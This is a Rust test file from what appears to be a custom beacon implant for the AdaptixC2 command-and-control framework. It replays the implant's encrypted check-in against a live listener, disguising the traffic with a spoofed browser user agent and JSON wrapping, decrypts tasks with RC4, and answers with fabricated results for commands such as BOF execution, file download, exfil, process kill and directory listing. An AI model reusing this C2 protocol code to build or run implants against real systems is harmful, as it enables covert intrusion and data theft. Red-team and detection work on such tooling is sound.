//! Check-in replay harness (step 4 of the phase 3 roadmap): replays the
//! beacon's exact wire bytes against a REAL AdaptixC2 `BeaconHTTP` listener
//! — through the same pure code the beacon runs (`transport::beat_header`,
//! `extract_payload_range`, `parse_task`, the results frame).
//!
//! `#[ignore]`d: it needs a live listener; CI never touches it. Run with
//! the listener's parameters (the operator creates the listener, then):
//!
//! ```sh
//! SPT_REPLAY_ADDR=127.0.0.1:8080 \
//! SPT_REPLAY_URI=/api/v1/report \
//! SPT_REPLAY_HB=X-Correlation-Id \
//! SPT_REPLAY_KEY=<listener encrypt_key, 32 hex> \
//! SPT_REPLAY_WM=5b3c7e21 \
//! SPT_REPLAY_AGENT=1234abcd \
//! SPT_REPLAY_SESSION=<64 hex — reuse across runs to resume the session> \
//! SPT_REPLAY_PREPEND='{"result":"' SPT_REPLAY_APPEND='","status":"ok"}' \
//! cargo test --target x86_64-unknown-linux-gnu -p specter-core --lib replay -- --ignored --nocapture
//! ```
//!
//! One run = one full beacon cycle: POST the beat, parse the hosted tasks,
//! and acknowledge every sleep task with a second POST carrying the
//! results body (the server then marks the task completed).

#![cfg(test)]

use std::env;
use std::io::{Read, Write};
use std::net::TcpStream;
// Explicit std imports: the crate is no_std, the test harness brings std.
use std::println;
use std::string::ToString;
use std::vec::Vec;

use crate::beat::BeatData;
use crate::rc4::Rc4;
use crate::transport;
use crate::wire::{Reader, Writer};

fn env_hex(name: &str) -> Vec<u8> {
    let s = env::var(name).unwrap_or_else(|_| panic!("{name} must be set"));
    (0..s.len() / 2)
        .map(|i| u8::from_str_radix(&s[2 * i..2 * i + 2], 16).expect("bad hex"))
        .collect()
}

fn env_u32(name: &str) -> u32 {
    u32::from_str_radix(
        &env::var(name).unwrap_or_else(|_| panic!("{name} must be set")),
        16,
    )
    .expect("bad hex u32")
}

/// One raw HTTP POST transaction against the listener; returns the
/// response body (page).
fn post(addr: &str, uri: &str, ua: &str, hb: &str, beat_b64: &[u8], body: &[u8]) -> Vec<u8> {
    let host = addr;
    let mut stream = TcpStream::connect(addr).expect("listener unreachable");
    let mut req = Vec::new();
    let put = |v: &mut Vec<u8>, b: &[u8]| v.extend_from_slice(b);
    put(&mut req, b"POST ");
    put(&mut req, uri.as_bytes());
    put(&mut req, b" HTTP/1.1\r\nHost: ");
    put(&mut req, host.as_bytes());
    put(&mut req, b"\r\nUser-Agent: ");
    put(&mut req, ua.as_bytes());
    put(
        &mut req,
        b"\r\nContent-Type: application/octet-stream\r\nAccept: application/json\r\n",
    );
    put(&mut req, hb.as_bytes());
    put(&mut req, b": ");
    put(&mut req, beat_b64);
    put(&mut req, b"\r\nContent-Length: ");
    put(&mut req, body.len().to_string().as_bytes());
    put(&mut req, b"\r\nConnection: close\r\n\r\n");
    put(&mut req, body);
    stream.write_all(&req).expect("send");
    let mut resp = Vec::new();
    stream.read_to_end(&mut resp).expect("read");
    // Strip the HTTP headers.
    let split = resp
        .windows(4)
        .position(|w| w == b"\r\n\r\n")
        .expect("no header/body split in response");
    resp[split + 4..].to_vec()
}

#[test]
#[ignore]
fn replay_check_in_against_real_listener() {
    let addr = env::var("SPT_REPLAY_ADDR").expect("SPT_REPLAY_ADDR");
    let uri = env::var("SPT_REPLAY_URI").expect("SPT_REPLAY_URI");
    let ua = env::var("SPT_REPLAY_UA")
        .unwrap_or_else(|_| {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36".to_string()
        });
    let hb = env::var("SPT_REPLAY_HB").expect("SPT_REPLAY_HB");
    let listener_key = env_hex("SPT_REPLAY_KEY");
    let watermark = env_u32("SPT_REPLAY_WM");
    let agent_id = env_u32("SPT_REPLAY_AGENT");
    let session_key = env_hex("SPT_REPLAY_SESSION");
    let prepend = env::var("SPT_REPLAY_PREPEND").expect("SPT_REPLAY_PREPEND");
    let append = env::var("SPT_REPLAY_APPEND").expect("SPT_REPLAY_APPEND");
    assert_eq!(listener_key.len(), 16, "listener key is 16 bytes");
    assert_eq!(session_key.len(), 32, "session key is 32 bytes");

    // The beat, as the beacon builds it from its collected identity.
    let beat = BeatData {
        sleep_sec: 30,
        jitter_pct: 10,
        killdate: 0,
        workingtime: 0,
        acp: 1252,
        oemcp: 437,
        gmt_offset: 2,
        pid: 0x1234,
        tid: 0x5678,
        build_number: 26100,
        major: 10,
        minor: 0,
        internal_ip: 0x0A00_020F,
        flags: 0b0011,
        session_key: &session_key,
        domain: b"MEGACORP",
        computer: b"WIN-TEST",
        username: b"nariod",
        process: b"testhost.exe",
    };
    let mut scratch = [0u8; 512];
    let mut header_val = [0u8; 720];
    let n = transport::beat_header(
        &beat,
        &listener_key,
        watermark,
        agent_id,
        &mut scratch,
        &mut header_val,
    )
    .expect("beat envelope");
    let beat_b64 = header_val[..n].to_vec();

    // Cycle 1: check-in (empty body) — pull the hosted tasks.
    let page = post(&addr, &uri, &ua, &hb, &beat_b64, b"");
    let (start, end) =
        transport::extract_payload_range(&page, prepend.as_bytes(), append.as_bytes())
            .expect("response page does not match the template");
    let mut payload = page[start..end].to_vec();
    Rc4::new(&session_key).crypt_in_place(&mut payload);

    if payload.is_empty() {
        println!("[replay] no hosted tasks; session is alive");
        return;
    }
    let mut head = Reader::new(&payload);
    let total = head.u32_le().expect("task pack size");
    let pack = head.take(total as usize).expect("truncated task pack");
    let mut r = Reader::new(pack);

    // Results are fabricated the way the Windows handlers produce them
    // (the pure builders of core::transport): this replays the exact
    // result bytes the implant would queue for its next POST.
    let mut packed = [0u8; 2048];
    let mut w = Writer::new(&mut packed);
    assert!(transport::begin_results(&mut w));
    let mut handled = 0usize;
    while r.remaining() >= 8 {
        // `execute bof` tasks (inline parse, like SAVEMEMORY): the replay
        // fabricates the full record sequence the loader produces —
        // started (async), one output callback, finished.
        if r.peek_u32_le() == Some(transport::COMMAND_EXEC_BOF) {
            match transport::parse_exec_bof(&mut r) {
                Some(task) => {
                    println!(
                        "[replay] task {:08x}: execute bof ({} bytes, entry '{}', async={})",
                        task.task_id,
                        task.bof.len(),
                        std::string::String::from_utf8_lossy(task.entry_name()),
                        task.async_flag
                    );
                    if task.async_flag {
                        assert!(transport::push_bof_lifecycle(
                            &mut w,
                            task.task_id,
                            transport::BOF_STATE_STARTED
                        ));
                    }
                    assert!(transport::push_bof_output(
                        &mut w,
                        task.task_id,
                        transport::CALLBACK_OUTPUT_UTF8,
                        b"[replay] BOF output (fabricated: the Windows loader runs the COFF)"
                    ));
                    assert!(transport::push_bof_lifecycle(
                        &mut w,
                        task.task_id,
                        transport::BOF_STATE_FINISHED
                    ));
                    handled += 1;
                }
                None => break,
            }
            continue;
        }
        // SAVEMEMORY chunks (upload content): consumed inline, no ack.
        if r.peek_u32_le() == Some(transport::COMMAND_SAVEMEMORY) {
            match transport::parse_save_memory(&mut r) {
                Some((memory_id, expected, chunk)) => {
                    println!(
                        "[replay] save-memory {memory_id:08x}: chunk {}/{} bytes",
                        chunk.len(),
                        expected
                    );
                }
                None => break,
            }
            continue;
        }
        match transport::parse_task(&mut r) {
            Some((transport::Task::Sleep { sec, jitter_pct }, id)) => {
                println!("[replay] task {id:08x}: sleep {sec}s, jitter {jitter_pct}%");
                assert!(transport::push_sleep_result(&mut w, id, sec, jitter_pct));
                handled += 1;
            }
            Some((transport::Task::Pwd, id)) => {
                println!("[replay] task {id:08x}: pwd (fabricated)");
                assert!(transport::push_path_result(
                    &mut w,
                    id,
                    transport::COMMAND_PWD,
                    b"C:\\Users\\specter"
                ));
                handled += 1;
            }
            Some((task @ transport::Task::Cd { .. }, id)) => {
                println!("[replay] task {id:08x}: cd (fabricated)");
                assert!(transport::push_path_result(
                    &mut w,
                    id,
                    transport::COMMAND_CD,
                    task.path()
                ));
                handled += 1;
            }
            Some((transport::Task::Ls { .. }, id)) => {
                println!("[replay] task {id:08x}: ls (fabricated)");
                assert!(transport::push_ls_result_header(
                    &mut w,
                    id,
                    b"C:\\Users\\specter",
                    2
                ));
                assert!(transport::push_ls_entry(
                    &mut w,
                    true,
                    0,
                    1_767_225_600,
                    b"Documents"
                ));
                assert!(transport::push_ls_entry(
                    &mut w,
                    false,
                    42,
                    1_767_225_600,
                    b"flag.txt"
                ));
                handled += 1;
            }
            Some((transport::Task::Cat { .. }, id)) => {
                println!("[replay] task {id:08x}: cat (fabricated)");
                assert!(transport::push_cat_result(
                    &mut w,
                    id,
                    b"C:\\Users\\specter\\flag.txt",
                    b"specter-rs replay content\n"
                ));
                handled += 1;
            }
            Some((task @ transport::Task::Mkdir { .. }, id)) => {
                println!("[replay] task {id:08x}: mkdir (fabricated)");
                assert!(transport::push_mkdir_result(&mut w, id, task.path()));
                handled += 1;
            }
            Some((transport::Task::Rm { .. }, id)) => {
                println!("[replay] task {id:08x}: rm (fabricated)");
                assert!(transport::push_rm_result(&mut w, id, false));
                handled += 1;
            }
            Some((transport::Task::Cp { .. }, id)) => {
                println!("[replay] task {id:08x}: cp (fabricated)");
                assert!(transport::push_plain_result(
                    &mut w,
                    id,
                    transport::COMMAND_COPY
                ));
                handled += 1;
            }
            Some((transport::Task::Mv { .. }, id)) => {
                println!("[replay] task {id:08x}: mv (fabricated)");
                assert!(transport::push_plain_result(
                    &mut w,
                    id,
                    transport::COMMAND_MV
                ));
                handled += 1;
            }
            Some((transport::Task::Getuid, id)) => {
                println!("[replay] task {id:08x}: getuid (fabricated)");
                assert!(transport::push_getuid_result(
                    &mut w,
                    id,
                    false,
                    b"MEGACORP",
                    b"nariod"
                ));
                handled += 1;
            }
            Some((transport::Task::Disks, id)) => {
                println!("[replay] task {id:08x}: disks (fabricated)");
                assert!(transport::push_disks_header(&mut w, id, 2));
                assert!(transport::push_disks_entry(&mut w, b'C', 3));
                assert!(transport::push_disks_entry(&mut w, b'D', 5));
                handled += 1;
            }
            Some((transport::Task::PsList, id)) => {
                println!("[replay] task {id:08x}: ps list (fabricated)");
                assert!(transport::push_ps_list_header(&mut w, id, 2));
                let root = transport::PsEntry {
                    pid: 4,
                    ppid: 0,
                    session: 0,
                    arch: 1,
                    elevated: false,
                    domain: b"",
                    username: b"SYSTEM",
                    name: b"System",
                };
                let child = transport::PsEntry {
                    pid: 1234,
                    ppid: 4,
                    session: 1,
                    arch: 1,
                    elevated: false,
                    domain: b"",
                    username: b"nariod",
                    name: b"testhost.exe",
                };
                assert!(transport::push_ps_entry(&mut w, &root));
                assert!(transport::push_ps_entry(&mut w, &child));
                handled += 1;
            }
            Some((transport::Task::PsKill { pid }, id)) => {
                println!("[replay] task {id:08x}: ps kill {pid} (fabricated)");
                assert!(transport::push_ps_kill_result(&mut w, id, pid));
                handled += 1;
            }
            Some((transport::Task::Download { .. }, id)) => {
                println!("[replay] task {id:08x}: download (fabricated)");
                assert!(transport::push_download_start(
                    &mut w,
                    id,
                    0x0AABB_CCD,
                    11,
                    b"C:\\flag.txt"
                ));
                assert!(transport::push_download_continue(
                    &mut w,
                    id,
                    0x0AABB_CCD,
                    b"flag-data\n"
                ));
                assert!(transport::push_download_finish(&mut w, id, 0x0AABB_CCD));
                handled += 1;
            }
            Some((transport::Task::Upload { .. }, id)) => {
                println!("[replay] task {id:08x}: upload (fabricated)");
                assert!(transport::push_upload_result(&mut w, id));
                handled += 1;
            }
            Some((transport::Task::Exfil { action, file_id }, id)) => {
                println!("[replay] task {id:08x}: exfil {action} (fabricated)");
                assert!(transport::push_exfil_result(&mut w, id, file_id, action));
                handled += 1;
            }
            Some((transport::Task::Terminate, id)) => {
                println!("[replay] task {id:08x}: terminate");
                return; // the real beacon exits here
            }
            Some((
                transport::Task::PsRun {
                    output, prog_state, ..
                },
                id,
            )) => {
                println!("[replay] task {id:08x}: ps run (fabricated)");
                assert!(transport::push_ps_run_result(
                    &mut w,
                    id,
                    0x1234,
                    output,
                    b"replay.exe"
                ));
                let _ = prog_state;
                handled += 1;
            }
            Some((transport::Task::JobsList, id)) => {
                println!("[replay] task {id:08x}: jobs list (fabricated)");
                assert!(transport::push_jobs_list_header(&mut w, id, 1));
                assert!(transport::push_jobs_list_entry(
                    &mut w,
                    id,
                    transport::JOB_TYPE_PROCESS,
                    0x1234
                ));
                handled += 1;
            }
            Some((transport::Task::JobsKill { job_id }, id)) => {
                println!("[replay] task {id:08x}: jobs kill {job_id:08x} (fabricated)");
                assert!(transport::push_jobs_kill_result(&mut w, id, true, job_id));
                handled += 1;
            }
            None => break,
        }
    }
    if handled == 0 {
        println!("[replay] no hosted tasks; session is alive");
        return;
    }

    // Cycle 2: the results body the beacon queues for its next POST.
    assert!(transport::finish_results(&mut w));
    let mut body = [0u8; 640];
    let n = transport::wrap_results_frame(w.written_bytes(), &mut body).expect("frame");
    Rc4::new(&session_key).crypt_in_place(&mut body[..n]);

    let page2 = post(&addr, &uri, &ua, &hb, &beat_b64, &body[..n]);
    let (start2, end2) =
        transport::extract_payload_range(&page2, prepend.as_bytes(), append.as_bytes())
            .expect("ack response page does not match the template");
    assert!(start2 == end2, "ack cycle should host no further tasks");
    println!("[replay] acknowledged {} task(s)", handled);
}
